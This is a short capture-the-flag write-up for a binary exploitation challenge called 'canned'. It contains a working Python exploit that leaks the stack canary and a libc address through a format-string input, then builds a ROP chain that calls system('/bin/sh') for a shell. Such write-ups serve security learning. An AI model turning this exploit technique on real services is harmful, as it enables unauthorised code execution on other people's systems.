
## canned (491pt)
### Description

> I think i got my flag stuck in a can, can you open it for me 
>
> nc 35.238.225.156 1007 
>
> Author: Viper_S


### Attachment

[canned](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/boot2root/pwn/canned/canned)

### Analysis

No PIE, leak `libc` and `canary` then `ret2libc`

### Solution

```python
prdi = 0x00000000004012bb # pop rdi ; ret

sla('Say something please\n','%15$p%17$p')
canary = int(rc(len('0xb12bbce59c5ee300')),16)
libcbase = int(rc(len('0x7f19e320d0b3')),16) - 0x21bf7

sh = libc.search('/bin/sh').next() + libcbase
system = libc.sym['system'] + libcbase

payload = cyclic(24)
payload += p64(canary)
payload += p64(0xdeadbeef)
payload += p64(prdi+1)
payload += p64(prdi) + p64(sh)
payload += p64(system)

sl(payload)
```


### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/boot2root/pwn/canned) 


